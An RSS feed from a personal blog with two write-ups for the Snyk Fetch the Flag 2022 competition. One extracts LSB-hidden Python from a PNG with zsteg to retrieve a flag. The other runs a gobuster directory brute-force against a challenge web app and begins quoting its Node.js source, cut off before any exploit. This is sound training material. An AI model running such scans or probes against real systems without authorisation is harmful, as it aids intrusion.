<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>FetchTheFlag - Tag - Pascal's Blog</title><link>https://blog.ppeinecke.de/tags/fetchtheflag/</link><description>FetchTheFlag - Tag - Pascal's Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 05 Dec 2022 00:20:38 +0100</lastBuildDate><atom:link href="https://blog.ppeinecke.de/tags/fetchtheflag/" rel="self" type="application/rss+xml"/><item><title>Synk Fetch the Flag 2022 - Forensics - Potty Training</title><link>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-forensics-potty-training/</link><pubDate>Mon, 05 Dec 2022 00:20:38 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-forensics-potty-training/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/potty.png" referrerpolicy="no-referrer">
            </div><h1 id="potty-training">Potty Training</h1>
<h2 id="writeup">writeup</h2>
<p>This challenge has no task description besides that the challenge was sponsored by stegano.</p>
<p>Let‚Äôs download the file from the description:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://fetch.ctf-snyk.io/files/4d3889ec3c6d7d8af2978a36d6bc1460/potty.png?token<span class="o">=</span>eyJ1c2VyX2lkIjo1MjExLCJ0ZWFtX2lkIjo0MDgsImZpbGVfaWQiOjQyfQ.Y2whFQ.hjYZ3KoJnXjQD7-foPUzzD8UTyQ -O potty.png
</span></span></code></pre></td></tr></table>
</div>
</div><p>Here is the image:</p>
<p></p>
<p>First let‚Äôs check if this is really a png file by running the <code>file</code> command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">file potty.png 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">potty.png: PNG image data, <span class="m">1650</span> x 1200, 8-bit/color RGB, non-interlaced
</span></span></code></pre></td></tr></table>
</div>
</div><p>So it looks like it is in fact a png file.</p>
<p>My first attempt was to just print out every readable string using the <code>strings</code> while searching for the flag format like so:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings potty.png <span class="p">|</span> grep SNYK
</span></span></code></pre></td></tr></table>
</div>
</div><p>But it did not find anything.</p>
<p>Knowing that we have a png file here, I could use some tools like <code>zsteg</code> to find the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zsteg ./potty.png   
</span></span><span class="line"><span class="cl">                                                                        <span class="m">1</span> ‚®Ø
</span></span><span class="line"><span class="cl">imagedata           .. text: <span class="s2">&#34;-\&#34;\nVD51%&#34;</span>
</span></span><span class="line"><span class="cl">b1,r,lsb,xy         .. text: <span class="s2">&#34;;R.3Ov?*7.&gt;?&amp;\&#34;&#34;</span>
</span></span><span class="line"><span class="cl">b1,rgb,lsb,xy       .. text: <span class="s2">&#34;111:\n        import requests\n        r = requests.get(&#39;http://potty-training.c.ctf-snyk.io/&#39;)\n        print(r.text)&#34;</span>
</span></span><span class="line"><span class="cl">b2,r,msb,xy         .. text: <span class="s2">&#34;]}}wUuUu&#34;</span>
</span></span><span class="line"><span class="cl">b2,g,msb,xy         .. text: <span class="s2">&#34;u}UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU&#34;</span>
</span></span><span class="line"><span class="cl">b2,b,lsb,xy         .. text: <span class="s2">&#34;AUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU&#34;</span>
</span></span><span class="line"><span class="cl">b4,r,lsb,xy         .. text: <span class="s2">&#34;gfgvgvvvfffvfffvfgwwggwvgffvfggwfggwgvvvfffvfffvfgfvgffvfggwfggwgvvwfgfvfwvwggfvfvwvfwfwgfwwgwgvfwwwfvvvfwgwfvwvfwwvfwwwfvgvfvfvfffvfffvggfvfwfvgvvwfgvwffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#34;</span>
</span></span><span class="line"><span class="cl">b4,r,msb,xy         .. text: <span class="s2">&#34;nnnfffnfffnf&#34;</span>
</span></span><span class="line"><span class="cl">b4,g,lsb,xy         .. text: <span class="s2">&#34;fwfvgffffgfffgfffgffvgvwvgfwvwfvvwfvvvfffgfffgfffgffgwfwvwfvvwfvvwvgvwvffwfvvgfwgwvvwwvvwwvvvgffwgfgvwvgggfvvgvwwgfgggfggwvfggfffgfffgffvgffwgvfvgvvvwfvgvffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#34;</span>
</span></span><span class="line"><span class="cl">b4,g,msb,xy         .. text: <span class="s2">&#34;nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#34;</span>
</span></span><span class="line"><span class="cl">b4,b,lsb,xy         .. file: <span class="m">0420</span> Alliant virtual executable not stripped
</span></span></code></pre></td></tr></table>
</div>
</div><p>zsteg found some python code hidden in the lsb (least significant bit) inside the image:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">import requests<span class="se">\n</span>        <span class="nv">r</span> <span class="o">=</span> requests.get<span class="o">(</span><span class="s1">&#39;http://potty-training.c.ctf-snyk.io/&#39;</span><span class="o">)</span><span class="se">\n</span>        print<span class="o">(</span>r.text<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>LSB steganography is a common way of hiding text inside images.</p>
<p>You can read more about LSB Steganography here: <a href="https://itnext.io/steganography-101-lsb-introduction-with-python-4c4803e08041" target="_blank" rel="noopener noreffer">https://itnext.io/steganography-101-lsb-introduction-with-python-4c4803e08041</a> as I will not dive too deep into how exactly this works here.</p>
<p>We can now start to create a new python program using the code we got from zsteg:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;import requests\n        r = requests.get(&#39;http://potty-training.c.ctf-snyk.io/&#39;)\n        print(r.text)&#34;</span> &gt; flag.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>let‚Äôs check it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat flag.py   
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">import requests
</span></span><span class="line"><span class="cl">        <span class="nv">r</span> <span class="o">=</span> requests.get<span class="o">(</span><span class="s1">&#39;http://potty-training.c.ctf-snyk.io/&#39;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        print<span class="o">(</span>r.text<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ok let‚Äôs try to run it and see if we can get the flag:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 ./flag.py
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">  &lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Good puppy!&lt;/title&gt;
</span></span><span class="line"><span class="cl">  &lt;/head&gt;
</span></span><span class="line"><span class="cl">  &lt;body&gt;
</span></span><span class="line"><span class="cl">    &lt;h1&gt;Good puppy! üêï&lt;/h1&gt;
</span></span><span class="line"><span class="cl">    &lt;p&gt;Here<span class="err">&#39;</span>s your flag ü¶¥&lt;/p&gt;
</span></span><span class="line"><span class="cl">    &lt;p&gt;SNYK<span class="o">{</span>dd67edb70a28335068dd5ea9304007b69543357ff471b3144e3355bca34cb35d<span class="o">}</span>&lt;/p&gt;
</span></span><span class="line"><span class="cl">    &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;https://snyk.io/blog/snyk-international-dog-day-recap/&#34;</span>&gt;Snyk + <span class="nv">Dogs</span> <span class="o">=</span> üíú&lt;/a&gt;
</span></span><span class="line"><span class="cl">  &lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>And it worked! We got back the flag from the sever.</p>
<p>flag: <code>SNYK{dd67edb70a28335068dd5ea9304007b69543357ff471b3144e3355bca34cb35d}</code></p>
]]></description></item><item><title>Synk Fetch the Flag 2022 - Web - File Explorer</title><link>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-web-file-explorer/</link><pubDate>Mon, 05 Dec 2022 00:09:37 +0100</pubDate><guid>https://blog.ppeinecke.de/posts/fetch-the-flag-2022-web-file-explorer/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/file_explorer.png" referrerpolicy="no-referrer">
            </div><h1 id="file-explorer">File Explorer</h1>
<h2 id="description">description</h2>
<p>tags:</p>
<ul>
<li>node.js</li>
<li>Snyk Open Source</li>
</ul>
<p>Expose hidden files in the web application.</p>
<p><a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a></p>
<p>hint: <a href="https://github.com/lcrowther-snyk/file-explorer" target="_blank" rel="noopener noreffer">https://github.com/lcrowther-snyk/file-explorer</a></p>
<h2 id="writeup">writeup</h2>
<p>After opening the website <a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a> in my webbrowser I see this:</p>
<p></p>
<p>the link with the caption ‚Äú<strong>here‚Äù</strong> redirects me to <a href="http://file-explorer.c.ctf-snyk.io/public/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/public/</a> and we can see a directory listing:</p>
<p></p>
<p>This is the source code of the main site (<a href="http://file-explorer.c.ctf-snyk.io/" target="_blank" rel="noopener noreffer">http://file-explorer.c.ctf-snyk.io/</a>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-title&#34;</span><span class="p">&gt;</span>Go ahead hack m3<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;page-title&#34;</span><span class="p">&gt;</span>find the flag<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Take a look at our files <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;/public/&#34;</span><span class="p">&gt;</span>here<span class="p">&lt;</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After I could not find anything interesting on that directory I ran gobuster to scan for any hidden files:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir gobuster
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gobuster dir --url <span class="o">[</span>http://file-explorer.c.ctf-snyk.io/<span class="o">](</span>http://file-explorer.c.ctf-snyk.io/<span class="o">)</span> --output gobuster/big.txt -w /usr/share/wordlists/dirb/big.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/blog9.txt            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/carrito.php          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/cd                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css-js.txt           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ebayimages.txt       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/edit_saved.php       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/editors.txt          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/edito.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/eds                  <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/elo.txt              <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gertrude             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gi.txt               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gizmo.txt            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glossario.txt        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glosuj               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/glossario.php        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/gprs.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/graduation           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34460</span> / <span class="m">81880</span> <span class="o">(</span>42.09%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:40:12 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/graphics2&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34536</span> / <span class="m">81880</span> <span class="o">(</span>42.18%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:40:30 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/greeting.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/gruppen.txt          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/guest-tracking.txt   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/guinness             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/h2                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">34912</span> / <span class="m">81880</span> <span class="o">(</span>42.64%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:41:55 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/gz.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/happyholidays        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kill                 <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kindeditor.php       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/kristi               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>g
</span></span><span class="line"><span class="cl">/lines.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/link_exchange.txt    <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/link_banner          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43600</span> / <span class="m">81880</span> <span class="o">(</span>53.25%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:52:46 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/links-page.txt&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/listing_photos       <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/listmail.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43776</span> / <span class="m">81880</span> <span class="o">(</span>53.46%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:10 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/liuyan.zip&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">43788</span> / <span class="m">81880</span> <span class="o">(</span>53.48%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:11 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/lit.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">44008</span> / <span class="m">81880</span> <span class="o">(</span>53.75%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:53:48 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/ln.php&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/louis.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/lucas.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/lulu.zip             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ma                   <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/ma-fr.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/m2css.zip            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/maint.php            <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/makeover.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/manufacturers        <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/marilyn.php          <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/mark                 <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">Progress: <span class="m">46060</span> / <span class="m">81880</span> <span class="o">(</span>56.25%<span class="o">)</span>              <span class="o">[</span>ERROR<span class="o">]</span> 2022/11/09 14:58:23 <span class="o">[</span>!<span class="o">]</span> Get <span class="s2">&#34;http://file-explorer.c.ctf-snyk.io/maxwell&#34;</span>: context deadline exceeded <span class="o">(</span>Client.Timeout exceeded <span class="k">while</span> awaiting headers<span class="o">)</span>
</span></span><span class="line"><span class="cl">/mypoints.php         <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span><span class="line"><span class="cl">/null.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 332<span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>But unfortunately gobuster did not find anything.</p>
<p>In the hint of this challenge is a github repository mentioned:</p>
<p><a href="https://github.com/lcrowther-snyk/file-explorer/blob/main/app.js" target="_blank" rel="noopener noreffer">file-explorer/app.js at main ¬∑ lcrowther-snyk/file-explorer</a></p>
<p>That looks to be the source code of this challenge!</p>
<p>The server is running node.js and here is the source code of the <code>app.js</code> file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Module dependencies.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">st</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;st&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// all environments
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;port&#39;</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">PORT</span> <span class="o">||</span> <span class="mi">3001</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">request</span><span class="p">,</span> <span class="nx">response</span><span class="p">){</span>
